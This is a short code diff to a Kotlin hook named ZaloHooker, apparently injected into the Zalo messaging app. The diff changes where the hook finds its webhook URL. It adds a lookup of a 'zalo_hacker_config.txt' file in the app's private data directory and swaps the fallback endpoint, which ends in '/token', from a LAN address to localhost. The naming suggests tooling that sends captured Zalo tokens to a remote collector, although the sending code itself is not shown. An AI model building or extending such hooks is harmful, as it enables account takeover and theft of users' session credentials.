@@ -23,6 +23,13 @@ object ZaloHooker {
 
     private fun getWebhookUrl(): String {
         try {
+            val privateConfig = java.io.File("/data/data/com.zing.zalo/zalo_hacker_config.txt")
+            if (privateConfig.exists()) {
+                val url = privateConfig.readText().trim()
+                if (url.isNotEmpty() && url.startsWith("http")) return url
+            }
+        } catch (e: Throwable) {}
+        try {
             val configFile = java.io.File(
                 android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS),
                 "zalo_hacker_config.txt"
@@ -32,7 +39,7 @@ object ZaloHooker {
                 if (url.isNotEmpty() && url.startsWith("http")) return url
             }
         } catch (e: Throwable) {}
-        return "http://192.168.29.108:5000/token"
+        return "http://127.0.0.1:5000/token"
     }
 
     private fun getAppName(appId: String): String {
